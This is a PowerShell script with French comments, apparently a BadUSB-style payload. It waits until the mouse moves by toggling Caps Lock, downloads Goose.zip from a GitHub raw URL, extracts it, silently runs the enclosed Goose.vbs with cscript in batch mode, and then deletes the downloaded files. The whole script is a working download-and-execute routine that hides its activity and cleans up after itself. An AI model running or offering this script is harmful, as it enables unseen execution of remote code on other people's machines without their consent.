function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}


# Chemin temporaire pour stocker le fichier ZIP
$tempZipPath = "$env:TEMP\Goose.zip"
$tempExtractPath = "$env:TEMP\Goose"

# Téléchargement du fichier ZIP depuis l'URL
Invoke-WebRequest -Uri "https://github.com/ertvg/h/raw/main/Goose.zip" -OutFile $tempZipPath

# Extraction du fichier ZIP
Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath

# Chemin du fichier VBS à exécuter
$vbsFilePath = "$tempExtractPath\Goose.vbs"

Pause-Script

# Vérifier si le fichier VBS existe
if (Test-Path $vbsFilePath) {
    # Exécution du fichier VBS
    cscript.exe //B //Nologo $vbsFilePath
} else {
    Write-Host "Le fichier Goose.vbs n'a pas été trouvé."
}

# Optionnel: Supprimer les fichiers temporaires après exécution
Remove-Item -Path $tempZipPath -Force
Remove-Item -Path $tempExtractPath -Recurse -Force
